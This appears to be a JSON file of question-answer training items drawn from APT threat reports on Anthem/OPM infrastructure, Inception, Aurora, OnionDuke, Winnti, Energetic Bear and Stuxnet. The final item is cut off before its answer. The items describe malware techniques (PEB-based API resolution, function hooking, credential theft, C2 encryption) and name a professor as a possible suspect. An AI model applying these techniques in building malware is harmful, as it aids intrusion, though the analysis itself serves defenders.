[
  {
    "instruction": "Medium Headline: [29]\nJust four minutes after the initial registration of topsec2014[.]com, the Whois records were updated from the initial registrant, Li Ning \u2013 li2384826402@yahoo[.]com to TopSec China \u2013 TopSec_2014@163[.]com.  This domain record has been unchanged since May 7th 2014. The we11point[.]com infrastructure and by extension the faux VAE Inc. infrastructure is associated with Cluster 2 of the ScanBox framework[30] by PwC. The latest PwC update to ScanBox states that there are \"links between the domain allegedly used in the Anthem hack (we11point.com) to Cluster 2 through shared WHOIS details.\"\nBig Headline: OPM Themed Infrastructure\nOne notable pattern was how the domain Whois registration information for the VAE, Inc. themed infrastructure was quickly updated and obfuscated with pseudorandom 10 character gmx.com email addresses and using the names of various comic book characters from the Iron Man franchise. This comic-themed naming convention has been previously documented by our friends at Crowdstrike[31] in what they characterize as being associated with a Chinese APT group they have dubbed \"Deep Panda\".\nLeveraging our DomainTools partnership, we were able to\ncorrelate the outlier domain opm-learning[.]org. This domain was also purportedly registered by the Iron Man movie hero \"Tony Stark\" on July 28, 2014. This infrastructure naming convention suggests a possible Of\u0141ce of Personnel Management (OPM) theme. However, in this case we lacked any speci\u0141c sample of malware to verify our initial suspicions that this infrastructure was operational. The possible OPM reference in the domain name is noteworthy considering it was revealed in July of 2014 that OPM had been compromised[32] by a likely state-sponsored Chinese actor in mid-March of that year. The fact this domain was registered after the breach occurred suggests that OPM could be an ongoing direct target of Chinese state-sponsored cyber espionage activity.\nOur attention then turned to the FBI Flash Report A-000049-MW[33] that was publicly reported by Brian Krebs [34]on February 6th, 2015. This FBI Flash Report was issued on January 27th, 2015, the same day an Anthem administrator detected suspicious activity according to an internal memo[35]. This memo goes on to indicate that the FBI would not be party to the Anthem breach until they were noti\u0141ed on January 29th, 2015; based on these facts we assess with high con\u0141dence that it is very unlikely that the FBI Flash Report was directly related to the Anthem breach. Rather, we suspect that the FBI \u0141ash report likely references the\nUSIS breach that was announced[36] on August 6, 2014, or the previous OPM breach, considering the statement that the breach involved \"compromised and stolen sensitive business information and Personally Identi\u0141able Information (PII) from US commercial and\ngovernment networks through cyber espionage.\"\nThe malware referenced within the FBI Report is associated with a Derusbi backdoor subvariant named \"InfoAdmin\" / \"Kakfum\" where the FBI speci\u0141cally references open source reporting of \"Deep Panda\" as being related to the malware observed in the attack. The malicious infrastructure highlighted in the report are the domains images.googlewebcache[.]com and smtp.outlookssl[.]com. Both of these top level domains were included with other related domains, all of which were shared on September 16th, 2013 to the ThreatConnect Subscriber Community in Incident 20130823C: Some.Trouble APT Domains[37], roughly a year and half prior to the FBI Flash report.\nIt is important to mention that both the domains images.googlewebcache[.]com and smtp.outlookssl[.]comas were also previously identi\u0141ed in an October 2014 PwC blog post[38] as seen within Cluster 1 of the Scanbox framework, while the Sakula activity with we11point and VAEIT is contained within Cluster 2 of that report. This implies that the actor referenced within the FBI Flash report uses shared capabilities (in this case the ScanBox kit) with the Sakula / we11point actor.\nBig Headline: Section Summary:\nThe Derusbi / Sakula malware seen in both the we11point[.]com and VAE Inc. campaigns were structurally the same and digitally signed with the DTOPTOOLZ signature.\nThe emerging theme is that this particular signature and family of malware is highly indicative of a particular Chinese APT activity.\nWithin this web of malicious infrastructure, there is an interesting overlap with the topsec2014[.]com domain and attack infrastructure.\nTCIRT identi\u0141ed a domain opm-learning[.]org that had a similar superhero themed WHOIS registrant to the Sakula / VAE Inc. infrastructure. The possible OPM reference is noteworthy considering the Of\u0141ce of Personnel Management (OPM) was compromised in March 2014. Additionally, an FBI Flash Report 0000-49MW referenced indicators that were possibly associated with the USIS hack and a Derusbi variant called \"Kakfum\" / \"InfoAdmin\". Both the FBI Flash infrastructure and the Sakula / VAE Inc. infrastructure are tied to the capability usage of the ScanBox framework, residing in Clusters 1 and 2 respectively.\nBig Headline: The Professor\nWe conducted open source research in pursuit of further information on the TopSec_2014@163[.]com email registrant.  A keyword search returned several results for \"topsec2014@163[.]com\" in association with a number of academic institutions in Nanjing, China.  Although the email\naddress wasn't an exact match to the topsec2014[.]com domain registrant (notice the absence of the underscore), such a similarity warranted further investigation.\n[39]\n[40]\nWe examined the links for any relevant intelligence, and discovered that nearly all of the search results led to pages that contained an announcement for an information security competition sponsored by the Southeast University-Topsec Information Security and Mobile Internet Technology Joint Research Center.  This entity appears to be a joint research venture between the University and Chinese networking giant Beijing Topsec Network Security Technology Co., a.k.a. Beijing Topsec.\n[41]\nThe announcements list a Professor \"Song Yubo\" as the point of contact for the event, and directs interested parties to his email address, topsec2014@163[.]com, for further questions.\n[43] According to his LinkedIn page, Song is a Teacher at the Southeast University, speci\u0141cally interested in the \u0141eld of telecommunications. Additionally, he is an avid researcher, and has published numerous academic papers on computer network exploitation on various e-journal publication sites, such as Google Scholar[45]. Further, he lists skills such as \"cryptography,\" \"penetration testing\" and \"computer network security,\" etc. on his Research Gate pro\u0141le[46].\n[47]\nAs we continued to develop a pro\u0141le on Professor Song, we began to have the sense that his interest in information security research strongly overlapped with that of someone who might be interested in or at least capable of conducting sophisticated cyber attacks. However, interests alone are not enough to warrant reasonable suspicion, so we had to do more digging.\nAdditionally, the soft link between TopSec_2014@163[.]com and topsec2014@163[.]com alone was not suf\u0141cient to make\nassociations with any reasonable con\u0141dence, but as it turns out, Yubo has in fact been previously named as a person of interest in the context of offensive Chinese cyber activity.\nBig Headline: The University\nIn March 2012, Northrop Grumman presented a commissioned report to Congress[49] detailing Chinese cyber warfare capabilities. The report asserts with high con\u0141dence that both Song and the Information Security Research Center at Southeast University have received numerous state-sponsored research grants, and by extension, cooperated with the Government of China in conducting information security research and development (R&D).  As stated on Southeast University's own website, the main purpose of these grants are to develop technical acumen amongst its students via providing support for \"state-owned scienti\u0141c research institutions, state key enterprises, government agencies and People's Liberation Army (PLA) units.\"\nBig Headline: The Competition\nAs we can see, the evidence continued to stack up.  The real smoking gun, however, was when we began to notice a strong temporal overlap with the various stages of the TOPSEC Cup that Song and Beijing Topsec were organizing, and the registration dates of malicious infrastructure as well as the malware compilation dates.\n[52] Based upon the translated registration form that we obtained from Song Yubo's personal Baidu document sharing account, open registration for the \"TOPSEC Cup\" began on May 4th, 2014 and would close on May 14th, 2014.\nThe details of the competition that were shared on the announcement are extremely ambiguous, and probably for good reason. The introductory paragraph mentions that the primary goal of the event is to facilitate the training and discovery of new talent, noting that exceptional participants would receive priority consideration for internships and jobs with Beijing Topsec.\nThe event itself was broken down into several distinct rounds of competition.  Firstly, the preliminary round required that all eligible registrants would attempt to remotely access and navigate through the network.  Should a participating team perform exceptionally in the preliminary qualifying round, they would be invited to participate in the \u0141nal round on-site in Nanjing.\nIn this \u0141nal round, participants would be required to build their own \"information systems and network environments.\"  The announcement notes that the students must rely upon their own laptop and software tools to accomplish this task.  Further, the announcement notes that participants are prohibited from attacking the provided server as well as their competitors.\n\nBased on the above text, answer a question. How are the domains images.googlewebcache[.]com and smtp.outlookssl[.]com linked to the FBI Flash Report A-000049-MW, and what does this imply about the actors involved?",
    "output": "The domains images.googlewebcache[.]com and smtp.outlookssl[.]com were referenced in the FBI Flash Report A-000049-MW, which mentioned a Derusbi backdoor subvariant named 'InfoAdmin' / 'Kakfum' associated with 'Deep Panda'. These domains were previously identified in an October 2014 PwC blog post as part of Cluster 1 of the ScanBox framework, while the Sakula activity with we11point and VAEIT is contained within Cluster 2. This implies that the actor referenced in the FBI Flash report uses shared capabilities (ScanBox kit) with the Sakula / we11point actor.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Embedded Shellcode Analysis - First Level\nNow, to the functionality of the shellcode. We will ignore the first two prolog instructions, and for remaining statements I have inserted comments to help understanding what is happening in this chunk of\ncode. It's traversing the TEB, the PEB and the Ldr structure to get the base addresses of ntdll.dll and kernel32.dll. It needs these to find the API addresses it requires for the rest of the infection.\nIn screenshot below, Function 00120F82 is the malware's own GetProcAddress function which takes two parameters\n1. Base address of the system dll\n2. Hash of the API name.\nThe function returns the memory address of the API.\n\nQuestion: How does the shellcode utilized by the Inception APT manage to locate the necessary API addresses for its infection process? Explain the role of the Thread Environment Block (TEB), Process Environment Block (PEB), and Loader (Ldr) structure in this context.\n\nAnswer:",
    "output": "The shellcode employed by the Inception APT traverses the Thread Environment Block (TEB), Process Environment Block (PEB), and Loader (Ldr) structure to obtain the base addresses of essential system DLLs, specifically ntdll.dll and kernel32.dll. This traversal is crucial because it allows the malware to locate the memory addresses of the APIs it needs for further infection activities. The shellcode includes a custom GetProcAddress function (Function 00120F82) that takes two parameters: the base address of the system DLL and the hash of the API name. By using these parameters, the function returns the memory address of the required API, enabling the malware to dynamically resolve and call the necessary system functions without directly importing them.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: COMMAND AND CONTROL\nThe payload communicates with its command and control server over port 443. The source port is randomly selected. While outbound traffic appears to be HTTPS, the actual traffi c uses a weak custom encryption scheme. The command and control packets have a very specifi c format.iv\nThe payload section is encrypted with a key selected by using GetTickCount. This means each infected node has its own key. The key is embedded in the header of the packet, and is easily recovered.\nMedium Headline: HOW THE MALWARE WORKS\nThe primary control logic can be found in the module registered under the service key (rasmon.dll, etc.). This module has been written in c and includes several specifi c methods and encodings that provide forensic track-ability.\nThe above screenshot illustrates a REcon\u2122 trace on the malware dropper and subsequent service creation. Location A. represents the dropper program, which unpacks itself and decompresses a file to the system32 directory. Point B. represents the initial svchost.exe startup, which is loading the malware payload. Location C. is the actual execution of the malware service, which remains persistent. At points E. and F. you can see the malware checking in with the command and control server. Finally, location D. represents the dissolvable batch file which deletes the initial dropper and then itself.\nAnswer this question: In the Aurora malware operation, how does the payload communicate with its command and control server, and what encryption scheme is used? Additionally, explain the significance of the key selection process.",
    "output": "In the Aurora malware operation, the payload communicates with its command and control server over port 443. The source port is randomly selected. While outbound traffic appears to be HTTPS, the actual traffic uses a weak custom encryption scheme. The command and control packets have a very specific format. The payload section is encrypted with a key selected by using GetTickCount, meaning each infected node has its own key. The key is embedded in the header of the packet and is easily recovered. This key selection process is significant because it allows for unique encryption keys for each infected node, making it harder to decrypt the communication without knowing the specific key, but also provides an avenue for forensic analysis as the key can be recovered from the packet header.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: A flowchart of the infection process\nOnce executed, the DLL file (SHA1: b491c14d8cfb48636f6095b7b16555e9a575d57f, detected as\nBackdoor:W32/OnionDuke.B) will decrypt an embedded configuration (shown below) and attempt to connect to hardcoded C&C URLs specified in the configuration data. From these C&Cs the malware may receive instructions to download and execute additional malicious components. It should be noted, that we believe all five domains contacted by the malware are innocent websites compromised by the malware operators, not dedicated malicious servers.\nBig Headline: A screenshot of the embedded configuration data\nThrough our research, we have also been able to identify multiple other components of the OnionDuke malware family. We have, for instance, observed components dedicated to stealing login credentials from the victim machine and components dedicated to gathering further information on the compromised system like the presence of antivirus software or a firewall. Some of these components have been observed being downloaded and executed by the original backdoor process but for other components, we have yet to identify the infection vector. Most of these components don't embed their own C&C information but rather communicate with their controllers through the original backdoor process.\nOne component, however, is an interesting exception. This DLL file (SHA1 d433f281cf56015941a1c2cb87066ca62ea1db37, detected as Backdoor:W32/OnionDuke.A) contains among its configuration data a different hardcoded C&C domain, overpict.com and also evidence suggesting that this component may abuse Twitter as an additional C&C channel. What makes the overpict.com domain interesting, is it was originally registered in 2011 with the alias of \"John Kasai\". Within a two-week window, \"John Kasai\" also registered the following domains: airtravelabroad.com, beijingnewsblog.net, grouptumbler.com, leveldelta.com, nasdaqblog.net, natureinhome.com, nestedmail.com, nostressjob.com, nytunion.com, oilnewsblog.com, sixsquare.net and ustradecomp.com. This is significant because the domains leveldelta.com and grouptumbler.com have previously been identified as C&C domains used by MiniDuke. This strongly suggests that although OnionDuke and MiniDuke are two separate families of malware, the actors behind them are connected through the use of shared infrastructure.\nBig Headline: A visualization of the infrastructure shared between OnionDuke and MiniDuke\nBased on compilation timestamps and discovery dates of samples we have observed, we believe the OnionDuke operators have been infecting downloaded executables at least since the end of October 2013. We also have evidence suggesting that, at least since February of 2014, OnionDuke has not only been spread by modifying downloaded executables but also by infecting executables in .torrent files containing pirated software. However, it would seem that the OnionDuke family is much older, both based on older compilation timestamps and also on the fact that some of the embedded configuration data make reference to an apparent version number of 4 suggesting that at least three earlier versions of the family exist.\nDuring our research, we have also uncovered strong evidence suggesting that OnionDuke has been used in targeted attacks against European government agencies, although we have so far been unable to identify the infection vector(s). Interestingly, this would suggest two very different targeting strategies. On one hand is the \"shooting a fly with a cannon\" mass-infection strategy through modified binaries and, on the other, the more surgical targeting traditionally associated with APT operations.\nIn any case, although much is still shrouded in mystery and speculation, one thing is certain. While using Tor may help you stay anonymous, it does at the same time paint a huge target on your back. It's never a good idea to download binaries via Tor (or anything else) without encryption. The problem with Tor is\nthat you have no idea who is maintaining the exit node you are using and what their motives are. VPNs (such as our (<http://www.f-secure.com/en/web/home_global/freedome>)Freedome VPN) will encrypt your connection all the way through the Tor network, so the maintainers of Tor exit nodes will not see your traffic and can't tamper with it.\nSamples:\n\u2022 a75995f94854dea8799650a2f4a97980b71199d2\n\u2022 b491c14d8cfb48636f6095b7b16555e9a575d57f\n\u2022 d433f281cf56015941a1c2cb87066ca62ea1db37\nDetected as: Trojan-Dropper:W32/OnionDuke.A, Backdoor:W32/OnionDuke.A, and Backdoor:W32/OnionDuke.B.\nPost by \u2014 Artturi ((<https://www.twitter.com/lehtior2>)@lehtior2)\n\nHow does the OnionDuke malware establish communication with its command and control (C&C) servers, and what implications does this have for the compromised systems?",
    "output": "The OnionDuke malware establishes communication with its C&C servers by decrypting an embedded configuration within the DLL file (SHA1: b491c14d8cfb48636f6095b7b16555e9a575d57f, detected as Backdoor:W32/OnionDuke.B) and attempting to connect to hardcoded C&C URLs specified in the configuration data. These C&C servers may instruct the malware to download and execute additional malicious components. Notably, the domains contacted by the malware are believed to be innocent websites compromised by the malware operators, not dedicated malicious servers. This approach allows the malware to blend in with legitimate traffic, making detection more challenging. Additionally, some components of the OnionDuke malware family, such as those dedicated to stealing login credentials and gathering system information, communicate with their controllers through the original backdoor process, further complicating detection and mitigation efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the case of Herman Simm illustrate the vulnerabilities associated with insider threats and cyber espionage, and what were the potential consequences of his actions?",
    "output": "The case of Herman Simm illustrated the significant vulnerabilities associated with insider threats and cyber espionage. Simm, the head of the State Secret Protection Office in Estonia, allegedly passed highly classified information on cyber security and missile defense to the Russian foreign Intelligence Service (SVR). His actions potentially compromised a large amount of classified information, including operational details of the NATO Cooperative Cyber Defence Centre in Tallinn. This case highlights that regardless of how secure a country's IT structure is, it remains vulnerable to individuals who compromise sensitive cyber security information for personal gain.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Launching the main function\nAs mentioned above, the PlusDLL library is a control module. Let's look at how the cybercriminals implemented the transition to perform the malicious DLL's main tasks. They could have simply called an appropriate function directly or created a separate thread in which to execute it, but for some reason they resorted to a trick: the code of the SetWindowStationUser function in the user32.dll library was modified. After modification, the function's first command became jmp <addr>, where <addr> is the address of the function in the PlusDLL library which implements the malicious library's main features.\nHook on SetWindowStationUser\nImmediately after this modification, a thread is created (CreateThread) executing code starting from the SetWindowStationUser function address. As a result, when control is eventually passed to this function, the inserted command jmp <addr> returns control back to the PlusDLL code.\nThe same method is used to execute two more functions in the PlusDLL library. One of them is used to initialize network routines; the other executes procedures terminating the malicious program at the very end. The only difference is that instead of SetWindowStationUser, the code of two other functions from user32.dll is modified \u2013 EndTask and WinHelpW, respectively.\nIt is likely that this was done in order to hide the real addresses of functions in PlusDLL in case its code was analyzed based on its execution logs using an automatic system (sandbox) that looks at all function calls. If this trick is used, an execution log would only show threads launched from the addresses of the functions SetWindowStationUser, EndTask and WinHelpW, which could potentially confuse researchers.\nAnother possibility is that this is an anti-emulation feature. Perhaps the emulators built into some anti-virus products are unable to cope with these 'leaps' \u2013 in this case, emulation will not result in the execution of malicious functions, which also suits the cybercriminals' purposes.\nSmall Headline: Target Functionality\nSo what does PlusDLL control? It turns out that the target functionality is implemented in different files. Each file provides a specific remote control feature and is downloaded from the attackers' server every time the system starts up. These files are not saved on disk or in the registry but are loaded directly into the memory.\nAt the very start of the operation, after launching the driver, PlusDLL collects information about the infected system. A unique identifier for the infected computer is generated based on information about the hard drive and the network adapter's MAC address, e.g., TKVFP-XZTTL-KXFWH-RBJLF-FXWJR. The attackers are interested primarily in the computer's name, the program which loaded the malicious library, as well as information about\nremote desktop sessions (session name, client name, user name and session time). All of this data is collected in a buffer, which is then compressed and sent to the attackers' control center. The buffer may look like this:\nThe bot sends information about an infected system to the control center\nIn reply to this initial message from the bot, the control center sends the list of available plugins. Plugins are DLL libraries that provide specific remote control functions. Upon receiving the list of plugins, the bot downloads them, allocates them in the memory and passes control to these libraries.\nDifferent C2 servers could push different plugins. In total we have discovered eight functional libraries:\nThese plugins form the core toolkit which is used by the perpetrators during attack.\nSmall Headline: Operation of the malicious platform\nOperation flowchart at the initial stage\nAs you can see, the cybercriminals use an entire inventory of malicious tools to effectively control the remote computer. Moreover, they have taken measures to conceal their activities: the plugins do not explicitly appear anywhere except in the computer's memory; they do not get saved to the hard drive; the driver is deleted immediately after launch; all traces in the registry that could indicate this launch get deleted. Only the initial DLL remains on the disk that kick starts the entire process and contains an encrypted version of PlusDLL which is the control DLL.\nOne of the weak points in this architecture is that the driver does get saved to the hard drive before it launches, so anti-virus products can detect the emergence of this file. The situation is further exacerbated by the fact that the malicious drivers may be signed (although not all drivers in the Winnti samples that we detected were in fact signed). An unsigned driver in itself does not have the means to counter antivirus products and its code can be easily recognized as malicious, whereas signed drivers stand a better chance of remaining undetected by antivirus products: certain anti-virus products consider properly signed programs legitimate by default, so as to minimize the chances of false positive responses.\nKaspersky Lab's products detect the malicious programs described above under the following verdicts:\nThe initial DLLs winmm.dll and apphelp.dll, the PlusDll.dll control DLLs, and functional loadable modules (CmdPlus.dll etc.) are detected as Backdoor.Win32.Winnti or Backdoor.Win64.Winnti.\nThe drivers sp1itter.sys and acplec.sys are detected as Rootkit.Win32.Winnti or Rootkit.Win64.Winnti.\n\nBased on the above text, answer a question. How did the Winnti group implement the transition to perform the main tasks of the malicious DLL, and what potential reasons might there be for using this method?",
    "output": "The Winnti group implemented the transition to perform the main tasks of the malicious DLL by modifying the code of the SetWindowStationUser function in the user32.dll library. They inserted a jump instruction (jmp <addr>) that redirected control to the PlusDLL library's main function. This method was likely used to obfuscate the real addresses of functions in PlusDLL, making it harder for automatic analysis systems (sandboxes) to trace the execution flow accurately. Additionally, it could serve as an anti-emulation feature, potentially confusing emulators built into some antivirus products, which might not handle these 'leaps' correctly.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: Sysinfo module\nThis module collects basic information about the system it's running on, and saves it to the %TEMP%\\{rand}.yls file. Harvested data includes:\n\u25cf Unique system ID\n\u25cf OS version\n\u25cf Username\n\u25cf Computer name\n\u25cf Country\n\u25cf Language\n\u25cf Current IP\n\u25cf List of drives\n\u25cf Default Browser\n\u25cf Running Processes\n\u25cf Proxy Setting\n\u25cf User Agent\n\u25cf Email Name\n\u25cf BIOS version and date\n\u25cf Lists of files and folders (non-recursive) from Desktop, My Documents and Program Files folders and root directories on all drives.\nVery Small Headline: Password stealer module\nThis module uses the embedded BrowserPasswordDecryptor 2.0 tool (hxxp://securityxploded.com/browser-password-decryptor.php) to dump login credentials stored by the password managers of various browsers. Decrypted passwords are saved into the %TEMP%\\~tmp1237.txt file, which is then copied by the parent module into an encrypted *.tmp.yls file.\nList of browsers supported by the tool (from the product\u2022s website):\n\u25cf Firefox\n\u25cf Internet Explorer\n\u25cf Google Chrome\n\u25cf Google Chrome Canary/SXS\n\u25cf CoolNovo Browser\n\u25cf Opera Browser\n\u25cf Apple Safari\n\u25cf Comodo Dragon Browser\n\u25cf SeaMonkey Browser\n\u25cf SRWare Iron Browser\n\u25cf Flock Browser\nVery Small Headline: 1. Description\nThis component is a simple downloader with a functionality similar to the Havex component.\nIt sends requests to the PHP script at the C&C (compromised website) and looks for specific data in the returned HTML code.\nIt writes the data (some ASCII strings) from between <I6></I6> tags to the file in  %TEMP%\\Low\\~task.tmp and the data (binary data XORed with 0x0A) from between <B6></B6> tags into the %TEMP%\\Low\\~ldXXXX.TMP file.\nThen it decrypts the ldXXXX.TMP file and loads it into memory.\nBased on the compilation times, we may assume that this loader was used to download and run modules before it was replaced by Havex.\nThe Ddex loader is analyzed in more detail in Appendix 4.\nVery Small Headline: 1. Description\nThis malware can be described as a classical RAT (Remote Access Trojan), since it gives the attacker a wide range of opportunities to control and interact with the victim machine.\nThe autonomous part of Sysmain installs and registers itself to be persistent in the system.\nThen it gathers general information about the victim system, like\n\u25cf User- and computer names\n\u25cf Locale information\n\u25cf Network- and drive status\n\u25cf Default browsers\n\u25cf Running processes\n\u25cf File listing from the user profile directory.\nWhen ready, this data is submitted to one of the C&C-servers. After that, it checks periodically for new commands from C&C (pulling via HTTP).\nWith a set of 11 commands, the malware is able to:\n\u25cf Execute shell-commands\n\u25cf Launch additional executables or libraries (sent by the attacker)\n\u25cf Collect arbitrary files for later exfiltration\n\u25cf Examine the victim\u2022s file system.\nThere are also commands used for maintenance purposes. Among others, there are commands to change the pubkey for C&C-communication or delete its traces in the registry.\nVery Small Headline: 2. C&C communication\nIt receives its commands from one of four static command-and-control servers. Every variant of this malware has its own set of servers.\nAs usual, the attackers are using webservers - most likely compromised ones - as part of their C&C-infrastructure. To communicate with the C&C-server, the Trojan makes use of asymmetric encryption with a hardcoded pair of private and public keys.\nAnother public key is used to encrypt files, which are collected in a local dropzone on the victim\u2022s file system. The files in that dropzone will be submitted to the attacker later, all in one go.\nAppendix 3 provides in-depth analysis of the Sysmain backdoor.\nVery Small Headline: 1. Description\nThis component is written in .NET and is very similar to The Sysmain backdoor. The settings of the RAT are stored in the registry as BASE64 encoded values.\nThe RAT gets its commands by sending a request to a PHP script on the C&C (compromised server) as usual, and looks for specific data in the returned HTML code. The data in this case is stored between the havexhavex tags, it is then decrypted and decoded (base64).\nThe RAT supports 13 commands including:\n\u00b7 Screen capture\n\u00b7 Trojan Update\n\u00b7 Loading DLLs\n\u00b7 Starting executables\n\u00b7 Running shell commands\n\u00b7 Listing directories\nEach time a command (task) is executed, the result of that command is stored in the registry under a subkey named \u2022done\u2022 or \u2022doneEXT\u2022.\nThe results (which are called \u2022answers\u2022 by the authors) are then POSTED to the C&C server.\nThe ClientX backdoor is analyzed in depth in Appendix 5.\nVery Small Headline: 1. Description\nKaragany is a simple backdoor that connects to the C&C and keeps waiting for commands. It can download and run additional executables, load/delete modules, read file content, reboot the computer, update itself and remove all components.\nBesides backdoor functionality, it also extracts credentials from Internet Explorer\u2022s password manager to the prx.jpg file and injects a small DLL into the processes of web browsers. This DLL keeps listening to outgoing network traffic and looking for basic access authentication details sent over unencrypted HTTP. Affected browsers include Internet Explorer, Firefox, Mozilla and Opera.\nWhen executed, it copies itself to the folder under %APPDATA% and creates a .lnk file in the %STARTUP% directory. The folder name and filename are chosen from a list of strings hardcoded in the binary:\nIt also creates the C:\\ProgramData\\Mail\\MailAg\\ folder, where the information harvested by downloaded modules will be stored.\nAfter checking if a connection to the Internet is up, it sends an initial POST request to the C&C server. Known parameters used in C&C communication are:\n\u25cf &identifiant=<victim_uid>, which is calculated based on system version, system install date, username and system metrics\n\u25cf &version=<bot_version_nr>\n\u25cf &fichier=<file_content>\nVery Small Headline: Screenshot module\nThis module is used to drop and run the DuckLink CmdCapture tool - a 3rd party freeware AutoIt application for capturing screenshots (hxxp://www.ducklink.com/).\nA screenshot of the desktop is saved into the C:\\ProgramData\\Mail\\MailAg\\scs.jpg file. Additionally, other system information - such as the date and time of capture, computer name, username, cpu architecture, os version, IP address, logon domain and logon server, desktop details (height, width, depth, refresh rate) and environmental variables - are logged in C:\\ProgramData\\Mail\\MailAg\\scs.txt file.\n\nAnswer this question based on the above context: Describe the command and control (C&C) communication mechanism of the Sysmain Trojan used by Energetic Bear/Crouching Yeti. How does it ensure secure communication and what types of commands can it execute?",
    "output": "The Sysmain Trojan receives its commands from one of four static command-and-control servers, each variant of the malware having its own set of servers. The attackers use compromised web servers as part of their C&C infrastructure. To communicate with the C&C server, the Trojan uses asymmetric encryption with a hardcoded pair of private and public keys. Another public key is used to encrypt files collected in a local dropzone on the victim's file system, which are later submitted to the attacker. The malware supports a set of 11 commands, allowing it to execute shell commands, launch additional executables or libraries, collect arbitrary files for later exfiltration, examine the victim's file system, and perform maintenance tasks such as changing the pubkey for C&C communication or deleting its traces in the registry.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Variants\nOut of 3,280 collected samples, three distinct variants have been identified. They have compile times of:\n\u2022 Mon Jun 22 16:31:47 2009\n\u2022 Mon Mar 01 05:52:35 2010\n\u2022 Wed Apr 14 10:56:22 2010\nA fourth variant is likely to exist as a driver file, signed with the JMicron digital certificate that was found, but the variant dropping this driver has yet to be recovered.\nThis document primarily concentrates on the March 2010 variant. The April 2010 variant only differs very slightly from the March 2010 variant. (For example, increasing the date at which USB spreading stops.) However, the June 2009 has significant differences from the March and April 2010 samples. The compile times appear accurate based on the infection times seen for each sample. A version number contained within the binary also corresponds to this chronology.\nAs discussed in the (<>)Stuxnet Architecture section, Stuxnet segregates its functionality via embedded resources. The newer variants have more resources, but are smaller in size. Shown below are the resources for both types shown side by side.\nThe resources in green were added in the latest version, the resources in red were removed from the older version, and the rest of the resources are constant between both old and new samples.\nThe reason for the difference in size is that Resource ID 207 is absent from the newer versions. Resource 207 is 520kB, so although more resources were added in newer versions of Stuxnet, the sum total of the new resource sizes is less than 520kB.\nThe difference in functionality between the June 2009 variant and the March and April 2010 variants is summarized below.\nMany of the components are actually identical or are close to identical, having the same functionality with slight differences in the code.\nResources 240, 241, and 242 represent the most significant additions between June 2009 and March 2010. These resources exploit the (<http://www.securityfocus.com/bid/41732>)Microsoft Windows Shortcut 'LNK' Files Automatic File Execution Vulnerability (BID 41732) and implement the Windows rootkit to hide files on USB drives.\nThe June 2009 variant also contained code that was removed in the March 2010 variants. In particular, the June 2009 variants supported Windows 9x and also used autorun.inf to spread on removal drives, instead of the LNK exploit.\nResource 207 and 231 were dropped from the newer version of Stuxnet. Resource 231 was used to communicate with the control servers and has the C&C server names stored in plain text within the file. The newer version of Stuxnet has moved the Internet connection functionality inside the main payload .dll file and has moved the URLs from inside resource 231 to the installer component, and the URLs are crudely obfuscated. This gives the attacker the distinct advantage of updating the configuration of each sample without having to rebuild the entire package with a new resource inside.\nResource 207 has also been removed but at least part of its functionality has been retained. Resource 250 contains code that previously resided inside resource 207, although as you can see from the sizes that resource 250 is much smaller, so some of the functionality of resource 207 has been removed.\nOf the more than 3000 samples recovered, almost all are 2010 variants. A very small percentage of the samples are the 2009 variant. The 2009 variant may have spread more slowly and infected far fewer computers, or the late discovery may have meant infections were either replaced with newer versions or remediated.\nFigure 31\nStuxnet Variants\nBig Headline: Summary\nStuxnet represents the first of many milestones in malicious code history \u2013 it is the first to exploit four 0-day vulnerabilities, compromise two digital certificates, and inject code into industrial control systems and hide the code from the operator. Whether Stuxnet will usher in a new generation of malicious code attacks towards real-world infrastructure\u2014overshadowing the vast majority of current attacks affecting more virtual or individual assets\u2014or if it is a once- in-a-decade occurrence remains to be seen.\nStuxnet is of such great complexity\u2014requiring significant resources to develop\u2014that few attackers will be capable of producing a similar threat, to such an extent that we would not expect masses of threats of similar in sophistication to suddenly appear. However, Stuxnet has highlighted direct-attack attempts on critical infrastructure are possible and not just theory or movie plotlines.\nThe real-world implications of Stuxnet are beyond any threat we have seen in the past. Despite the exciting challenge in reverse engineering Stuxnet and understanding its purpose, Stuxnet is the type of threat we hope to never see again.\nMedium Headline: The oem6c.pnf log file\nThis file is created as %Windir%\\inf\\oem6c.pnf.\nIt is encrypted and used to log information about various actions executed by Stuxnet. This data file appears to have a fixed size of 323,848 bytes. However the payload size is initially empty.\nOn top of storing paths of recorded or infected Step7 project files, other records of information are stored. Each record has an ID, a timestamp, and (eventually) data.\nHere is a list of records that can be stored to oem6c.pnf:\nMedium Headline: Version 1.4 (February 11, 2011)\n\u2022 New content added to the (<>)Infection Statistics, (<>)The monitor thread, (<>)Sequence C, and (<>)Variants sections.\n\u2022 Minor edits and updates to (<>)Configuration Data Block, (<>)Behavior of a PLC infected by sequence A/B, and (<>)Other (<>)export hooks sections.\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation.\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.\nSmall Headline: About Symantec\nSymantec is a global leader in providing security, storage and systems management solutions to help businesses and consumers secure and manage their information. Headquartered in Cupertino, Calif., Symantec has operations in more than 40 countries. More information is available at www.symantec.com.\nFor specific country offices and contact numbers, please visit our Web site. For product information in the U.S., call toll-free 1 (800) 745 6054.\nSymantec Corporation World Headquarters 20330 Stevens Creek Blvd. Cupertino, CA 95014 USA +1 (408) 517 8000 1 (800) 721 3934 www.symantec.com\nCopyright \u00a9 2011 Symantec Corporation. All rights reserved. Symantec and the Symantec logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners.\nAnswer this question: How did the evolution of Stuxnet variants over time reflect changes in its functionality and spreading mechanisms?",
